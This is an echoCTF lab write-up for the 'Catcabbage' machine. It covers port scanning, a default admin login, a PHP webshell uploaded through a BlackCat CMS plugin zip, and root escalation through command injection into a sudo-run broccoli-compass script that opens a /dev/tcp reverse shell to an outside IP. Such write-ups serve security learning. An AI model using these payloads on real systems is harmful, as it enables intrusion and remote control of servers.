---
description: >-
  Catcabbage echoCTF Machine
title: Catcabbage (Intermediate)                # Add title here
date: 2025-02-19 08:00:00 -0600                           # Change the date to match completion date
categories: [echoCTF, Intermediate]                     # Change Templates to Writeup
tags: []     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Catcabbage.png                # Add infocard image here for post preview image
---
##### Host entries
```bash
10.0.160.219    catcabbage.echocity-f.com
```

### Content

-  Default Credentials
-  Blackcat Cms v1.4 - Remote Code Execution (RCE) 
-  RCE in broccoli-compass

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.219
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.219 ()   Status: Up
Host: 10.0.160.219 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```
Services and Versions running:
```bash
nmap -p22,80 -sCV -n -Pn -vvvv -oN targeted 10.0.160.219
Nmap scan report for 10.0.160.219
Host is up, received user-set (0.17s latency).
Scanned at 2025-02-20 00:03:42 EST for 42s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 ea:cf:8b:53:37:68:9b:9c:f9:a9:c8:e0:f5:cd:bf:04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNkNFS/WNRsP6swoQVM88OHkWuu/itOfvhNRQdspAqMhCpN0qTnLkRmWjmAEmcfM7f8pjkAYuEHzvcMMkx4vvLM=
|   256 e4:2e:76:72:24:c4:0b:a2:3b:79:bb:8a:65:30:b2:a3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOQbbEM7sFZ+8wW3CKzvSG717VFtghPe4egPndkGq4j6
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.61 ((Debian))
| http-robots.txt: 10 disallowed entries 
| /account/ /backend/ /config.php /framework/ /include/ 
|_/modules/ /temp/ /kit2/config /kit2/framework /kit2/logfile
|_http-title: BlackCat CMS - Maintenance
|_http-server-header: Apache/2.4.61 (Debian)
```

### Exploitation
There is only HTTP port open which has a web page only:

![](/assets/img/Pasted-image-20250219230503.png)

However, every resource redirects to `http://catcabbage.echocity-f.com/` which means we need to add an entry to our `/etc/hosts` file:
```bash
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


10.0.160.234    superclass.echocity-f.com

```

Looking for exploits on this CMS, we identified the following [Blackcat CMS RCE](https://www.exploit-db.com/exploits/51605)

Now, the important thing here is that the exploit requires authentication, so we tried with the most common pair of credentials, and voila, the following credentials did work `admin:admin123`.

The exploit marks the following steps:
1. Login to account as admin
2. Go to admin-tools => jquery plugin (http://localhost/BlackCatCMS-1.4/upload/backend/admintools/tool.php?tool=jquery_plugin_mgr)
3. Upload zip file but this zip file must contains poc.php 
4. Go to http://localhost/BlackCatCMS-1.4/upload/modules/lib_jquery/plugins/poc/poc.php?code=cat%20/etc/passwd

So first we need to access the admin-tools and jQuery Plugin Manager feature:
![](/assets/img/Pasted-image-20250219230715.png)

Second, we need to create a file with our webshell:
```bash
<?php system($_REQUEST["cmd"]); ?>
```
Then zip the file so it can be accepted by the application:
```bash
zip shell.zip shell.php
  adding: shell.php (stored 0%)
```
And finally, go to the route where the shell was unzipped `http://catcabbage.echocity-f.com/modules/lib_jquery/plugins/shell/shell.php`

![](/assets/img/Pasted-image-20250219231300.png)

If everything goes as planned you'll have a webshell.

### Privilege Escalation

I then proceed to execute the command `sudo -l` and I can execute a script as user root without password:
```bash
www-data@catcabbage:/var/www/html/modules/lib_jquery/plugins/shell$ sudo -l
Matching Defaults entries for www-data on catcabbage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on catcabbage:
    (ALL : ALL) NOPASSWD: /usr/local/bin/cabbage
```
This is the content of it:
```bash
www-data@catcabbage:/var/www/html/modules/lib_jquery/plugins/shell$ cat /usr/local/bin/cabbage
#! /usr/bin/env node
var args = process.argv.slice(2);
var compileSass = require('broccoli-compass');

if(args.length<1)
{
  console.error('Error, missing list of SASS files to process...');
  process.exit(1);
}
compileSass({}, {
    'files': args
```
As usual, the vulnerability relays on the imported library, in this case `broccoli-compass`, there is a vulnerability reported as [Remote code execution in broccoli-compass](https://security.snyk.io/vuln/SNYK-JS-BROCCOLICOMPASS-5458974), after reading the article and with the aid of DeepSeek I came with the following payload:
```bash
www-data@catcabbage:/tmp$ sudo /usr/local/bin/cabbage '/tmp/file.scss; bash -c "bash -i >& /dev/tcp/10.10.5.122/1234 0>&1"'
```
And we ARE INSIDEEEE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`

### Credentials

- Credentials identified for BlackCMS `admin:admin123`

### Notes

-  Nothing fancy here, super classic exploits.

### References

- [Blackcat CMS RCE](https://www.exploit-db.com/exploits/51605)
- [Remote code execution in broccoli-compass](https://security.snyk.io/vuln/SNYK-JS-BROCCOLICOMPASS-5458974)




